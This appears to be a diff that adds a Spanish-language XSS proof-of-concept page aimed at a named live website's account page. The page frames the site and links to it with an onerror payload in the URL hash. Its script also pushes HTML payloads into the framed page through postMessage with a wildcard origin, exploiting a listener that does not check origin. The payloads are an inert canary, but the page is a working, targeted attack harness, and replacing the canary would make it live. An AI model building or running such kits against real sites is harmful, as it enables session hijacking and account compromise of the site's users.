@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Kit PoC - vellius.com</title></head>
+<body style="font-family:monospace;background:#000;color:#0f0;padding:12px">
+<h3>KIT PoC LOCAL - vellius.com</h3>
+<p>Cadena: <b>XSS ejecutable (CSP no lo frena)</b> (postMessage XSS (listener sin origen) | XSS-DOM potencial | Bypass de CSP (ausente))</p>
+<p>Canario inerte: si ves <b>CANARY_ESCALADA_OK</b> dentro del sitio en el
+iframe de abajo, la cadena aterriza. Nada sale de tu maquina.</p>
+<p>1. iframe del blanco con sesion propia (logueate en otra pestana primero):</p>
+<iframe id="v" src="https://vellius.com/account" style="width:100%;height:480px;background:#fff"></iframe>
+<p>2. <a href="https://vellius.com/account#&lt;img src=x onerror=&quot;document.title=&#x27;CANARY_ESCALADA_OK&#x27;&quot;&gt;" target="_blank">link con hash canario inerte</a> (abrir logueado)</p>
+<p>3. Al abrir el iframe o el link, buscar el banner verde
+<b>CANARY_ESCALADA_OK</b> dentro de la pagina del sitio.</p>
+<script>
+
+  // PIEZA postMessage: enviar el canario inerte al iframe (varias formas)
+  function probePM() {
+    var f = document.getElementById('v');
+    var shapes = [
+      "<div style='background:#0f0;color:#000;font:bold 18px monospace;padding:6px'>CANARY_ESCALADA_OK</div>",
+      {data: "<div style='background:#0f0;color:#000;font:bold 18px monospace;padding:6px'>CANARY_ESCALADA_OK</div>"},
+      {message: "<div style='background:#0f0;color:#000;font:bold 18px monospace;padding:6px'>CANARY_ESCALADA_OK</div>"},
+      {type: 'canary', data: "<div style='background:#0f0;color:#000;font:bold 18px monospace;padding:6px'>CANARY_ESCALADA_OK</div>"}
+    ];
+    shapes.forEach(function (s, i) {
+      setTimeout(function () {
+        try { f.contentWindow.postMessage(s, '*'); } catch (e) {}
+      }, 800 * (i + 1));
+    });
+  }
+  probePM();
+
+</script>
+</body></html>
